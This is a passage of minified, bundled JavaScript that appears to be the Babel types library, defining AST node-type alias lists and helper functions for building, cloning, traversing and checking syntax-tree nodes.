uM=m((gM)=>{Object.defineProperty(gM,"__esModule",{value:!0});gM.WHILE_TYPES=gM.USERWHITESPACABLE_TYPES=gM.UNARYLIKE_TYPES=gM.TYPESCRIPT_TYPES=gM.TSTYPE_TYPES=gM.TSTYPEELEMENT_TYPES=gM.TSENTITYNAME_TYPES=gM.TSBASETYPE_TYPES=gM.TERMINATORLESS_TYPES=gM.STATEMENT_TYPES=gM.STANDARDIZED_TYPES=gM.SCOPABLE_TYPES=gM.PUREISH_TYPES=gM.PROPERTY_TYPES=gM.PRIVATE_TYPES=gM.PATTERN_TYPES=gM.PATTERNLIKE_TYPES=gM.OBJECTMEMBER_TYPES=gM.MODULESPECIFIER_TYPES=gM.MODULEDECLARATION_TYPES=gM.MISCELLANEOUS_TYPES=gM.METHOD_TYPES=gM.LVAL_TYPES=gM.LOOP_TYPES=gM.LITERAL_TYPES=gM.JSX_TYPES=gM.IMPORTOREXPORTDECLARATION_TYPES=gM.IMMUTABLE_TYPES=gM.FUNCTION_TYPES=gM.FUNCTIONPARENT_TYPES=gM.FUNCTIONPARAMETER_TYPES=gM.FOR_TYPES=gM.FORXSTATEMENT_TYPES=gM.FLOW_TYPES=gM.FLOWTYPE_TYPES=gM.FLOWPREDICATE_TYPES=gM.FLOWDECLARATION_TYPES=gM.FLOWBASEANNOTATION_TYPES=gM.EXPRESSION_TYPES=gM.EXPRESSIONWRAPPER_TYPES=gM.EXPORTDECLARATION_TYPES=gM.ENUMMEMBER_TYPES=gM.ENUMBODY_TYPES=gM.DECLARATION_TYPES=gM.CONDITIONAL_TYPES=gM.COMPLETIONSTATEMENT_TYPES=gM.CLASS_TYPES=gM.BLOCK_TYPES=gM.BLOCKPARENT_TYPES=gM.BINARY_TYPES=gM.ACCESSOR_TYPES=void 0;var s1=G6(),mJ0=gM.STANDARDIZED_TYPES=s1.FLIPPED_ALIAS_KEYS.Standardized,uJ0=gM.EXPRESSION_TYPES=s1.FLIPPED_ALIAS_KEYS.Expression,cJ0=gM.BINARY_TYPES=s1.FLIPPED_ALIAS_KEYS.Binary,lJ0=gM.SCOPABLE_TYPES=s1.FLIPPED_ALIAS_KEYS.Scopable,pJ0=gM.BLOCKPARENT_TYPES=s1.FLIPPED_ALIAS_KEYS.BlockParent,dJ0=gM.BLOCK_TYPES=s1.FLIPPED_ALIAS_KEYS.Block,iJ0=gM.STATEMENT_TYPES=s1.FLIPPED_ALIAS_KEYS.Statement,rJ0=gM.TERMINATORLESS_TYPES=s1.FLIPPED_ALIAS_KEYS.Terminatorless,nJ0=gM.COMPLETIONSTATEMENT_TYPES=s1.FLIPPED_ALIAS_KEYS.CompletionStatement,aJ0=gM.CONDITIONAL_TYPES=s1.FLIPPED_ALIAS_KEYS.Conditional,oJ0=gM.LOOP_TYPES=s1.FLIPPED_ALIAS_KEYS.Loop,sJ0=gM.WHILE_TYPES=s1.FLIPPED_ALIAS_KEYS.While,tJ0=gM.EXPRESSIONWRAPPER_TYPES=s1.FLIPPED_ALIAS_KEYS.ExpressionWrapper,eJ0=gM.FOR_TYPES=s1.FLIPPED_ALIAS_KEYS.For,XY0=gM.FORXSTATEMENT_TYPES=s1.FLIPPED_ALIAS_KEYS.ForXStatement,QY0=gM.FUNCTION_TYPES=s1.FLIPPED_ALIAS_KEYS.Function,JY0=gM.FUNCTIONPARENT_TYPES=s1.FLIPPED_ALIAS_KEYS.FunctionParent,YY0=gM.PUREISH_TYPES=s1.FLIPPED_ALIAS_KEYS.Pureish,WY0=gM.DECLARATION_TYPES=s1.FLIPPED_ALIAS_KEYS.Declaration,GY0=gM.FUNCTIONPARAMETER_TYPES=s1.FLIPPED_ALIAS_KEYS.FunctionParameter,HY0=gM.PATTERNLIKE_TYPES=s1.FLIPPED_ALIAS_KEYS.PatternLike,$Y0=gM.LVAL_TYPES=s1.FLIPPED_ALIAS_KEYS.LVal,zY0=gM.TSENTITYNAME_TYPES=s1.FLIPPED_ALIAS_KEYS.TSEntityName,UY0=gM.LITERAL_TYPES=s1.FLIPPED_ALIAS_KEYS.Literal,KY0=gM.IMMUTABLE_TYPES=s1.FLIPPED_ALIAS_KEYS.Immutable,VY0=gM.USERWHITESPACABLE_TYPES=s1.FLIPPED_ALIAS_KEYS.UserWhitespacable,BY0=gM.METHOD_TYPES=s1.FLIPPED_ALIAS_KEYS.Method,qY0=gM.OBJECTMEMBER_TYPES=s1.FLIPPED_ALIAS_KEYS.ObjectMember,ZY0=gM.PROPERTY_TYPES=s1.FLIPPED_ALIAS_KEYS.Property,MY0=gM.UNARYLIKE_TYPES=s1.FLIPPED_ALIAS_KEYS.UnaryLike,jY0=gM.PATTERN_TYPES=s1.FLIPPED_ALIAS_KEYS.Pattern,FY0=gM.CLASS_TYPES=s1.FLIPPED_ALIAS_KEYS.Class,QZ1=gM.IMPORTOREXPORTDECLARATION_TYPES=s1.FLIPPED_ALIAS_KEYS.ImportOrExportDeclaration,OY0=gM.EXPORTDECLARATION_TYPES=s1.FLIPPED_ALIAS_KEYS.ExportDeclaration,AY0=gM.MODULESPECIFIER_TYPES=s1.FLIPPED_ALIAS_KEYS.ModuleSpecifier,RY0=gM.ACCESSOR_TYPES=s1.FLIPPED_ALIAS_KEYS.Accessor,LY0=gM.PRIVATE_TYPES=s1.FLIPPED_ALIAS_KEYS.Private,DY0=gM.FLOW_TYPES=s1.FLIPPED_ALIAS_KEYS.Flow,NY0=gM.FLOWTYPE_TYPES=s1.FLIPPED_ALIAS_KEYS.FlowType,wY0=gM.FLOWBASEANNOTATION_TYPES=s1.FLIPPED_ALIAS_KEYS.FlowBaseAnnotation,IY0=gM.FLOWDECLARATION_TYPES=s1.FLIPPED_ALIAS_KEYS.FlowDeclaration,CY0=gM.FLOWPREDICATE_TYPES=s1.FLIPPED_ALIAS_KEYS.FlowPredicate,PY0=gM.ENUMBODY_TYPES=s1.FLIPPED_ALIAS_KEYS.EnumBody,SY0=gM.ENUMMEMBER_TYPES=s1.FLIPPED_ALIAS_KEYS.EnumMember,EY0=gM.JSX_TYPES=s1.FLIPPED_ALIAS_KEYS.JSX,TY0=gM.MISCELLANEOUS_TYPES=s1.FLIPPED_ALIAS_KEYS.Miscellaneous,_Y0=gM.TYPESCRIPT_TYPES=s1.FLIPPED_ALIAS_KEYS.TypeScript,kY0=gM.TSTYPEELEMENT_TYPES=s1.FLIPPED_ALIAS_KEYS.TSTypeElement,bY0=gM.TSTYPE_TYPES=s1.FLIPPED_ALIAS_KEYS.TSType,vY0=gM.TSBASETYPE_TYPES=s1.FLIPPED_ALIAS_KEYS.TSBaseType,xY0=gM.MODULEDECLARATION_TYPES=QZ1});var N$=m((cM)=>{Object.defineProperty(cM,"__esModule",{value:!0});cM.default=tZ1;var MY=d0(),D$=c9();function tZ1(X,Q){if((0,MY.isBlockStatement)(X))return X;let J=[];if((0,MY.isEmptyStatement)(X))J=[];else{if(!(0,MY.isStatement)(X))if((0,MY.isFunction)(Q))X=(0,D$.returnStatement)(X);else X=(0,D$.expressionStatement)(X);J=[X]}return(0,D$.blockStatement)(J)}});var pM=m((lM)=>{Object.defineProperty(lM,"__esModule",{value:!0});lM.default=Q31;var X31=N$();function Q31(X,Q="body"){let J=(0,X31.default)(X[Q],X);return X[Q]=J,J}});var w$=m((dM)=>{Object.defineProperty(dM,"__esModule",{value:!0});dM.default=G31;var Y31=$5(),W31=h4();function G31(X){X=X+"";let Q="";for(let J of X)Q+=(0,W31.isIdentifierChar)(J.codePointAt(0))?J:"-";if(Q=Q.replace(/^[-0-9]+/,""),Q=Q.replace(/[-\s]+(.)?/g,function(J,Y){return Y?Y.toUpperCase():""}),!(0,Y31.default)(Q))Q=`_${Q}`;return Q||"_"}});var rM=m((iM)=>{Object.defineProperty(iM,"__esModule",{value:!0});iM.default=z31;var $31=w$();function z31(X){if(X=(0,$31.default)(X),X==="eval"||X==="arguments")X="_"+X;return X}});var aM=m((nM)=>{Object.defineProperty(nM,"__esModule",{value:!0});nM.default=B31;var K31=d0(),V31=c9();function B31(X,Q=X.key||X.property){if(!X.computed&&(0,K31.isIdentifier)(Q))Q=(0,V31.stringLiteral)(Q.name);return Q}});var tM=m((oM)=>{Object.defineProperty(oM,"__esModule",{value:!0});oM.default=void 0;var p4=d0(),cY0=oM.default=Z31;function Z31(X){if((0,p4.isExpressionStatement)(X))X=X.expression;if((0,p4.isExpression)(X))return X;if((0,p4.isClass)(X))X.type="ClassExpression",X.abstract=!1;else if((0,p4.isFunction)(X))X.type="FunctionExpression";if(!(0,p4.isExpression)(X))throw Error(`cannot turn ${X.type} to an expression`);return X}});var I$=m((Qj)=>{Object.defineProperty(Qj,"__esModule",{value:!0});Qj.default=d4;var M31=G6(),eM=Symbol(),Xj=Symbol();function d4(X,Q,J){if(!X)return!1;let Y=M31.VISITOR_KEYS[X.type];if(!Y)return!1;J=J||{};let W=Q(X,J);if(W!==void 0)switch(W){case eM:return!1;case Xj:return!0}for(let G of Y){let H=X[G];if(!H)continue;if(Array.isArray(H)){for(let $ of H)if(d4($,Q,J))return!0}else if(d4(H,Q,J))return!0}return!1}d4.skip=eM;d4.stop=Xj});var C$=m((Yj)=>{Object.defineProperty(Yj,"__esModule",{value:!0});Yj.default=A31;var F31=z5(),Jj=["tokens","start","end","loc","raw","rawValue"],O31=[...F31.COMMENT_KEYS,"comments",...Jj];function A31(X,Q={}){let J=Q.preserveComments?Jj:O31;for(let W of J)if(X[W]!=null)X[W]=void 0;for(let W of Object.keys(X))if(W[0]==="_"&&X[W]!=null)X[W]=void 0;let Y=Object.getOwnPropertySymbols(X);for(let W of Y)X[W]=null}});var P$=m((Wj)=>{Object.defineProperty(Wj,"__esModule",{value:!0});Wj.default=N31;var L31=I$(),D31=C$();function N31(X,Q){return(0,L31.default)(X,D31.default,Q),X}});var $j=m((Hj)=>{Object.defineProperty(Hj,"__esModule",{value:!0});Hj.default=aX;var Gj=d0(),I31=ZX(),C31=P$();function aX(X,Q=X.key){let J;if(X.kind==="method")return aX.increment()+"";else if((0,Gj.isIdentifier)(Q))J=Q.name;else if((0,Gj.isStringLiteral)(Q))J=JSON.stringify(Q.value);else J=JSON.stringify((0,C31.default)((0,I31.default)(Q)));if(X.computed)J=`[${J}]`;if(X.static)J=`static:${J}`;return J}aX.uid=0;aX.increment=function(){if(aX.uid>=Number.MAX_SAFE_INTEGER)return aX.uid=0;else return aX.uid++}});var Kj=m((zj)=>{Object.defineProperty(zj,"__esModule",{value:!0});zj.default=void 0;var jY=d0(),S31=c9(),nY0=zj.default=E31;function E31(X,Q){if((0,jY.isStatement)(X))return X;let J=!1,Y;if((0,jY.isClass)(X))J=!0,Y="ClassDeclaration";else if((0,jY.isFunction)(X))J=!0,Y="FunctionDeclaration";else if((0,jY.isAssignmentExpression)(X))return(0,S31.expressionStatement)(X);if(J&&!X.id)Y=!1;if(!Y)if(Q)return!1;else throw Error(`cannot turn ${X.type} to a statement`);return X.type=Y,X}});var qj=m((Vj)=>{Object.defineProperty(Vj,"__esModule",{value:!0});Vj.default=void 0;var T31=$5(),e0=c9(),oY0=Vj.default=S$,_31=Function.call.bind(Object.prototype.toString);function k31(X){return _31(X)==="[object RegExp]"}function b31(X){if(typeof X!=="object"||X===null||Object.prototype.toString.call(X)!=="[object Object]")return!1;let Q=Object.getPrototypeOf(X);return Q===null||Object.getPrototypeOf(Q)===null}function S$(X){if(X===void 0)return(0,e0.identifier)("undefined");if(X===!0||X===!1)return(0,e0.booleanLiteral)(X);if(X===null)return(0,e0.nullLiteral)();if(typeof X==="string")return(0,e0.stringLiteral)(X);if(typeof X==="number"){let Q;if(Number.isFinite(X))Q=(0,e0.numericLiteral)(Math.abs(X));else{let J;if(Number.isNaN(X))J=(0,e0.numericLiteral)(0);else J=(0,e0.numericLiteral)(1);Q=(0,e0.binaryExpression)("/",J,(0,e0.numericLiteral)(0))}if(X<0||Object.is(X,-0))Q=(0,e0.unaryExpression)("-",Q);return Q}if(typeof X==="bigint")if(X<0)return(0,e0.unaryExpression)("-",(0,e0.bigIntLiteral)(-X));else return(0,e0.bigIntLiteral)(X);if(k31(X)){let Q=X.source,J=/\/([a-z]*)$/.exec(X.toString())[1];return(0,e0.regExpLiteral)(Q,J)}if(Array.isArray(X))return(0,e0.arrayExpression)(X.map(S$));if(b31(X)){let Q=[];for(let J of Object.keys(X)){let Y,W=!1;if((0,T31.default)(J))if(J==="__proto__")W=!0,Y=(0,e0.stringLiteral)(J);else Y=(0,e0.identifier)(J);else Y=(0,e0.stringLiteral)(J);Q.push((0,e0.objectProperty)(Y,S$(X[J]),W))}return(0,e0.objectExpression)(Q)}throw Error("don't know how to turn this value into a node")}});var Mj=m((Zj)=>{Object.defineProperty(Zj,"__esModule",{value:!0});Zj.default=x31;var v31=c9();function x31(X,Q,J=!1){return X.object=(0,v31.memberExpression)(X.object,X.property,X.computed),X.property=Q,X.computed=!!J,X}});var Oj=m((Fj)=>{Object.defineProperty(Fj,"__esModule",{value:!0});Fj.default=y31;var jj=z5(),h31=L$();function y31(X,Q){if(!X||!Q)return X;for(let J of jj.INHERIT_KEYS.optional)if(X[J]==null)X[J]=Q[J];for(let J of Object.keys(Q))if(J[0]==="_"&&J!=="__clone")X[J]=Q[J];for(let J of jj.INHERIT_KEYS.force)X[J]=Q[J];return(0,h31.default)(X,Q),X}});var Rj=m((Aj)=>{Object.defineProperty(Aj,"__esModule",{value:!0});Aj.default=c31;var m31=c9(),u31=$0();function c31(X,Q){if((0,u31.isSuper)(X.object))throw Error("Cannot prepend node to super property access (`super.foo`).");return X.object=(0,m31.memberExpression)(Q,X.object),X}});var Dj=m((Lj)=>{Object.defineProperty(Lj,"__esModule",{value:!0});Lj.default=p31;function p31(X){let Q=[].concat(X),J=Object.create(null);while(Q.length){let Y=Q.pop();if(!Y)continue;switch(Y.type){case"ArrayPattern":Q.push(...Y.elements);break;case"AssignmentExpression":case"AssignmentPattern":case"ForInStatement":case"ForOfStatement":Q.push(Y.left);break;case"ObjectPattern":Q.push(...Y.properties);break;case"ObjectProperty":Q.push(Y.value);break;case"RestElement":case"UpdateExpression":Q.push(Y.argument);break;case"UnaryExpression":if(Y.operator==="delete")Q.push(Y.argument);break;case"Identifier":J[Y.name]=Y;break;default:break}}return J}});var i4=m((Nj)=>{Object.defineProperty(Nj,"__esModule",{value:!0});Nj.default=E$;var P8=d0();function E$(X,Q,J,Y){let W=[].concat(X),G=Object.create(null);while(W.length){let H=W.shift();if(!H)continue;if(Y&&((0,P8.isAssignmentExpression)(H)||(0,P8.isUnaryExpression)(H)||(0,P8.isUpdateExpression)(H)))continue;if((0,P8.isIdentifier)(H)){if(Q)(G[H.name]=G[H.name]||[]).push(H);else G[H.name]=H;continue}if((0,P8.isExportDeclaration)(H)&&!(0,P8.isExportAllDeclaration)(H)){if((0,P8.isDeclaration)(H.declaration))W.push(H.declaration);continue}if(J){if((0,P8.isFunctionDeclaration)(H)){W.push(H.id);continue}if((0,P8.isFunctionExpression)(H))continue}let $=E$.keys[H.type];if($)for(let z=0;z<$.length;z++){let U=$[z],K=H[U];if(K)if(Array.isArray(K))W.push(...K);else W.push(K)}}return G}var i31={DeclareClass:["id"],DeclareFunction:["id"],DeclareModule:["id"],DeclareVariable:["id"],DeclareInterface:["id"],DeclareTypeAlias:["id"],DeclareOpaqueType:["id"],InterfaceDeclaration:["id"],TypeAlias:["id"],OpaqueType:["id"],CatchClause:["param"],LabeledStatement:["label"],UnaryExpression:["argument"],AssignmentExpression:["left"],ImportSpecifier:["local"],ImportNamespaceSpecifier:["local"],ImportDefaultSpecifier:["local"],ImportDeclaration:["specifiers"],TSImportEqualsDeclaration:["id"],ExportSpecifier:["exported"],ExportNamespaceSpecifier:["exported"],ExportDefaultSpecifier:["exported"],FunctionDeclaration:["id","params"],FunctionExpression:["id","params"],ArrowFunctionExpression:["params"],ObjectMethod:["params"],ClassMethod:["params"],ClassPrivateMethod:["params"],ForInStatement:["left"],ForOfStatement:["left"],ClassDeclaration:["id"],ClassExpression:["id"],RestElement:["argument"],UpdateExpression:["argument"],ObjectProperty:["value"],AssignmentPattern:["left"],ArrayPattern:["elements"],ObjectPattern:["properties"],VariableDeclaration:["declarations"],VariableDeclarator:["id"]};E$.keys=i31});var Cj=m((wj)=>{Object.defineProperty(wj,"__esModule",{value:!0});wj.default=void 0;var n31=i4(),YW0=wj.default=a31;function a31(X,Q){return(0,n31.default)(X,Q,!0)}});var Ej=m((Sj)=>{Object.defineProperty(Sj,"__esModule",{value:!0});Sj.default=s31;var H6=d0();function o31(X){if((0,H6.isNullLiteral)(X))return"null";if((0,H6.isRegExpLiteral)(X))return`/${X.pattern}/${X.flags}`;if((0,H6.isTemplateLiteral)(X))return X.quasis.map((Q)=>Q.value.raw).join("");if(X.value!==void 0)return String(X.value);return null}function Pj(X){if(!X.computed||(0,H6.isLiteral)(X.key))return X.key}function s31(X,Q){if("id"in X&&X.id)return{name:X.id.name,originalNode:X.id};let J="",Y;if((0,H6.isObjectProperty)(Q,{value:X}))Y=Pj(Q);else if((0,H6.isObjectMethod)(X)||(0,H6.isClassMethod)(X)){if(Y=Pj(X),X.kind==="get")J="get ";else if(X.kind==="set")J="set "}else if((0,H6.isVariableDeclarator)(Q,{init:X}))Y=Q.id;else if((0,H6.isAssignmentExpression)(Q,{operator:"=",right:X}))Y=Q.left;if(!Y)return null;let W=(0,H6.isLiteral)(Y)?o31(Y):(0,H6.isIdentifier)(Y)?Y.name:(0,H6.isPrivateName)(Y)?Y.id.name:null;if(W==null)return null;return{name:J+W,originalNode:Y}}});var _j=m((Tj)=>{Object.defineProperty(Tj,"__esModule",{value:!0});Tj.default=XM1;var e31=G6();function XM1(X,Q,J){if(typeof Q==="function")Q={enter:Q};let{enter:Y,exit:W}=Q;T$(X,Y,W,J,[])}function T$(X,Q,J,Y,W){let G=e31.VISITOR_KEYS[X.type];if(!G)return;if(Q)Q(X,W,Y);for(let H of G){let $=X[H];if(Array.isArray($))for(let z=0;z<$.length;z++){let U=$[z];if(!U)continue;W.push({node:X,key:H,index:z}),T$(U,Q,J,Y,W),W.pop()}else if($)W.push({node:X,key:H}),T$($,Q,J,Y,W),W.pop()}if(J)J(X,W,Y)}});var bj=m((kj)=>{Object.defineProperty(kj,"__esModule",{value:!0});kj.default=YM1;var JM1=i4();function YM1(X,Q,J){if(J&&X.type==="Identifier"&&Q.type==="ObjectProperty"&&J.type==="ObjectExpression")return!1;let Y=JM1.default.keys[Q.type];if(Y)for(let W=0;W<Y.length;W++){let G=Y[W],H=Q[G];if(Array.isArray(H)){if(H.includes(X))return!0}else if(H===X)return!0}return!1}});var k$=m((vj)=>{Object.defineProperty(vj,"__esModule",{value:!0});vj.default=HM1;var GM1=d0();_$=Symbol.for("var used to be block scoped");var _$;function HM1(X){return(0,GM1.isVariableDeclaration)(X)&&(X.kind!=="var"||X[_$])}});var hj=m((fj)=>{Object.defineProperty(fj,"__esModule",{value:!0});fj.default=UM1;var xj=d0(),zM1=k$();function UM1(X){return(0,xj.isFunctionDeclaration)(X)||(0,xj.isClassDeclaration)(X)||(0,zM1.default)(X)}});var gj=m((yj)=>{Object.defineProperty(yj,"__esModule",{value:!0});yj.default=qM1;var VM1=WY(),BM1=d0();function qM1(X){if((0,VM1.default)(X.type,"Immutable"))return!0;if((0,BM1.isIdentifier)(X))if(X.name==="undefined")return!0;else return!1;return!1}});var cj=m((uj)=>{Object.defineProperty(uj,"__esModule",{value:!0});uj.default=b$;var mj=G6();function b$(X,Q){if(typeof X!=="object"||typeof Q!=="object"||X==null||Q==null)return X===Q;if(X.type!==Q.type)return!1;let J=Object.keys(mj.NODE_FIELDS[X.type]||X.type),Y=mj.VISITOR_KEYS[X.type];for(let W of J){let G=X[W],H=Q[W];if(typeof G!==typeof H)return!1;if(G==null&&H==null)continue;else if(G==null||H==null)return!1;if(Array.isArray(G)){if(!Array.isArray(H))return!1;if(G.length!==H.length)return!1;for(let $=0;$<G.length;$++)if(!b$(G[$],H[$]))return!1;continue}if(typeof G==="object"&&!(Y!=null&&Y.includes(W))){for(let $ of Object.keys(G))if(G[$]!==H[$])return!1;continue}if(!b$(G,H))return!1}return!0}});var pj=m((lj)=>{Object.defineProperty(lj,"__esModule",{value:!0});lj.default=jM1;function jM1(X,Q,J){switch(Q.type){case"MemberExpression":case"OptionalMemberExpression":if(Q.property===X)return!!Q.computed;return Q.object===X;case"JSXMemberExpression":return Q.object===X;case"VariableDeclarator":return Q.init===X;case"ArrowFunctionExpression":return Q.body===X;case"PrivateName":return!1;case"ClassMethod":case"ClassPrivateMethod":case"ObjectMethod":if(Q.key===X)return!!Q.computed;return!1;case"ObjectProperty":if(Q.key===X)return!!Q.computed;return!J||J.type!=="ObjectPattern";case"ClassProperty":case"ClassAccessorProperty":if(Q.key===X)return!!Q.computed;return!0;case"ClassPrivateProperty":return Q.key!==X;case"ClassDeclaration":case"ClassExpression":return Q.superClass===X;case"AssignmentExpression":return Q.right===X;case"AssignmentPattern":return Q.right===X;case"LabeledStatement":return!1;case"CatchClause":return!1;case"RestElement":return!1;case"BreakStatement":case"ContinueStatement":return!1;case"FunctionDeclaration":case"FunctionExpression":return!1;case"ExportNamespaceSpecifier":case"ExportDefaultSpecifier":return!1;case"ExportSpecifier":if(J!=null&&J.source)return!1;return Q.local===X;case"ImportDefaultSpecifier":case"ImportNamespaceSpecifier":case"ImportSpecifier":return!1;case"ImportAttribute":return!1;case"JSXAttribute":return!1;case"ObjectPattern":case"ArrayPattern":return!1;case"MetaProperty":return!1;case"ObjectTypeProperty":return Q.key!==X;case"TSEnumMember":return Q.id!==X;case"TSPropertySignature":if(Q.key===X)return!!Q.computed;return!0}return!0}});var ij=m((dj)=>{Object.defineProperty(dj,"__esModule",{value:!0});dj.default=OM1;var oX=d0();function OM1(X,Q){if((0,oX.isBlockStatement)(X)&&((0,oX.isFunction)(Q)||(0,oX.isCatchClause)(Q)))return!1;if((0,oX.isPattern)(X)&&((0,oX.isFunction)(Q)||(0,oX.isCatchClause)(Q)))return!0;return(0,oX.isScopable)(X)}});var aj=m((nj)=>{Object.defineProperty(nj,"__esModule",{value:!0});nj.default=RM1;var rj=d0();function RM1(X){return(0,rj.isImportDefaultSpecifier)(X)||(0,rj.isIdentifier)(X.imported||X.exported,{name:"default"})}});var sj=m((oj)=>{Object.defineProperty(oj,"__esModule",{value:!0});oj.default=wM1;var DM1=$5(),NM1=new Set(["abstract","boolean","byte","char","double","enum","final","float","goto","implements","int","interface","long","native","package","private","protected","public","short","static","synchronized","throws","transient","volatile"]);function wM1(X){return(0,DM1.default)(X)&&!NM1.has(X)}});var ej=m((tj)=>{Object.defineProperty(tj,"__esModule",{value:!0});tj.default=PM1;var CM1=d0();v$=Symbol.for("var used to be block scoped");var v$;function PM1(X){return(0,CM1.isVariableDeclaration)(X,{kind:"var"})&&!X[v$]}});var QF=m((XF)=>{Object.defineProperty(XF,"__esModule",{value:!0});XF.default=FY;var EM1=i4(),sX=d0(),x$=c9(),f$=M$(),TM1=ZX();function FY(X,Q){let J=[],Y=!0;for(let W of X){if(!(0,sX.isEmptyStatement)(W))Y=!1;if((0,sX.isExpression)(W))J.push(W);else if((0,sX.isExpressionStatement)(W))J.push(W.expression);else if((0,sX.isVariableDeclaration)(W)){if(W.kind!=="var")return;for(let G of W.declarations){let H=(0,EM1.default)(G);for(let $ of Object.keys(H))Q.push({kind:W.kind,id:(0,TM1.default)(H[$])});if(G.init)J.push((0,x$.assignmentExpression)("=",G.id,G.init))}Y=!0}else if((0,sX.isIfStatement)(W)){let G=W.consequent?FY([W.consequent],Q):(0,f$.buildUndefinedNode)(),H=W.alternate?FY([W.alternate],Q):(0,f$.buildUndefinedNode)();if(!G||!H)return;J.push((0,x$.conditionalExpression)(W.test,G,H))}else if((0,sX.isBlockStatement)(W)){let G=FY(W.body,Q);if(!G)return;J.push(G)}else if((0,sX.isEmptyStatement)(W)){if(X.indexOf(W)===0)Y=!0}else return}if(Y)J.push((0,f$.buildUndefinedNode)());if(J.length===1)return J[0];else return(0,x$.sequenceExpression)(J)}});var YF=m((JF)=>{Object.defineProperty(JF,"__esModule",{value:!0});JF.default=bM1;var kM1=QF();function bM1(X,Q){if(!(X!=null&&X.length))return;let J=[],Y=(0,kM1.default)(X,J);if(!Y)return;for(let W of J)Q.push(W);return Y}});var $0=m((O1)=>{Object.defineProperty(O1,"__esModule",{value:!0});var MX={react:!0,assertNode:!0,createTypeAnnotationBasedOnTypeof:!0,createUnionTypeAnnotation:!0,createFlowUnionType:!0,createTSUnionType:!0,cloneNode:!0,clone:!0,cloneDeep:!0,cloneDeepWithoutLoc:!0,cloneWithoutLoc:!0,addComment:!0,addComments:!0,inheritInnerComments:!0,inheritLeadingComments:!0,inheritsComments:!0,inheritTrailingComments:!0,removeComments:!0,ensureBlock:!0,toBindingIdentifierName:!0,toBlock:!0,toComputedKey:!0,toExpression:!0,toIdentifier:!0,toKeyAlias:!0,toStatement:!0,valueToNode:!0,appendToMemberExpression:!0,inherits:!0,prependToMemberExpression:!0,removeProperties:!0,removePropertiesDeep:!0,removeTypeDuplicates:!0,getAssignmentIdentifiers:!0,getBindingIdentifiers:!0,getOuterBindingIdentifiers:!0,getFunctionName:!0,traverse:!0,traverseFast:!0,shallowEqual:!0,is:!0,isBinding:!0,isBlockScoped:!0,isImmutable:!0,isLet:!0,isNode:!0,isNodesEquivalent:!0,isPlaceholderType:!0,isReferenced:!0,isScope:!0,isSpecifierDefault:!0,isType:!0,isValidES3Identifier:!0,isValidIdentifier:!0,isVar:!0,matchesPattern:!0,validate:!0,buildMatchMemberExpression:!0,__internal__deprecationWarning:!0};Object.defineProperty(O1,"__internal__deprecationWarning",{enumerable:!0,get:function(){return yj1.default}});Object.defineProperty(O1,"addComment",{enumerable:!0,get:function(){return iM1.default}});Object.defineProperty(O1,"addComments",{enumerable:!0,get:function(){return rM1.default}});Object.defineProperty(O1,"appendToMemberExpression",{enumerable:!0,get:function(){return zj1.default}});Object.defineProperty(O1,"assertNode",{enumerable:!0,get:function(){return yM1.default}});Object.defineProperty(O1,"buildMatchMemberExpression",{enumerable:!0,get:function(){return hj1.default}});Object.defineProperty(O1,"clone",{enumerable:!0,get:function(){return cM1.default}});Object.defineProperty(O1,"cloneDeep",{enumerable:!0,get:function(){return lM1.default}});Object.defineProperty(O1,"cloneDeepWithoutLoc",{enumerable:!0,get:function(){return pM1.default}});Object.defineProperty(O1,"cloneNode",{enumerable:!0,get:function(){return uM1.default}});Object.defineProperty(O1,"cloneWithoutLoc",{enumerable:!0,get:function(){return dM1.default}});Object.defineProperty(O1,"createFlowUnionType",{enumerable:!0,get:function(){return WF.default}});Object.defineProperty(O1,"createTSUnionType",{enumerable:!0,get:function(){return mM1.default}});Object.defineProperty(O1,"createTypeAnnotationBasedOnTypeof",{enumerable:!0,get:function(){return gM1.default}});Object.defineProperty(O1,"createUnionTypeAnnotation",{enumerable:!0,get:function(){return WF.default}});Object.defineProperty(O1,"ensureBlock",{enumerable:!0,get:function(){return eM1.default}});Object.defineProperty(O1,"getAssignmentIdentifiers",{enumerable:!0,get:function(){return Zj1.default}});Object.defineProperty(O1,"getBindingIdentifiers",{enumerable:!0,get:function(){return Mj1.default}});Object.defineProperty(O1,"getFunctionName",{enumerable:!0,get:function(){return Fj1.default}});Object.defineProperty(O1,"getOuterBindingIdentifiers",{enumerable:!0,get:function(){return jj1.default}});Object.defineProperty(O1,"inheritInnerComments",{enumerable:!0,get:function(){return nM1.default}});Object.defineProperty(O1,"inheritLeadingComments",{enumerable:!0,get:function(){return aM1.default}});Object.defineProperty(O1,"inheritTrailingComments",{enumerable:!0,get:function(){return sM1.default}});Object.defineProperty(O1,"inherits",{enumerable:!0,get:function(){return Uj1.default}});Object.defineProperty(O1,"inheritsComments",{enumerable:!0,get:function(){return oM1.default}});Object.defineProperty(O1,"is",{enumerable:!0,get:function(){return Rj1.default}});Object.defineProperty(O1,"isBinding",{enumerable:!0,get:function(){return Lj1.default}});Object.defineProperty(O1,"isBlockScoped",{enumerable:!0,get:function(){return Dj1.default}});Object.defineProperty(O1,"isImmutable",{enumerable:!0,get:function(){return Nj1.default}});Object.defineProperty(O1,"isLet",{enumerable:!0,get:function(){return wj1.default}});Object.defineProperty(O1,"isNode",{enumerable:!0,get:function(){return Ij1.default}});Object.defineProperty(O1,"isNodesEquivalent",{enumerable:!0,get:function(){return Cj1.default}});Object.defineProperty(O1,"isPlaceholderType",{enumerable:!0,get:function(){return Pj1.default}});Object.defineProperty(O1,"isReferenced",{enumerable:!0,get:function(){return Sj1.default}});Object.defineProperty(O1,"isScope",{enumerable:!0,get:function(){return Ej1.default}});Object.defineProperty(O1,"isSpecifierDefault",{enumerable:!0,get:function(){return Tj1.default}});Object.defineProperty(O1,"isType",{enumerable:!0,get:function(){return _j1.default}});Object.defineProperty(O1,"isValidES3Identifier",{enumerable:!0,get:function(){return kj1.default}});Object.defineProperty(O1,"isValidIdentifier",{enumerable:!0,get:function(){return bj1.default}});Object.defineProperty(O1,"isVar",{enumerable:!0,get:function(){return vj1.default}});Object.defineProperty(O1,"matchesPattern",{enumerable:!0,get:function(){return xj1.default}});Object.defineProperty(O1,"prependToMemberExpression",{enumerable:!0,get:function(){return Kj1.default}});O1.react=void 0;Object.defineProperty(O1,"removeComments",{enumerable:!0,get:function(){return tM1.default}});Object.defineProperty(O1,"removeProperties",{enumerable:!0,get:function(){return Vj1.default}});Object.defineProperty(O1,"removePropertiesDeep",{enumerable:!0,get:function(){return Bj1.default}});Object.defineProperty(O1,"removeTypeDuplicates",{enumerable:!0,get:function(){return qj1.default}});Object.defineProperty(O1,"shallowEqual",{enumerable:!0,get:function(){return 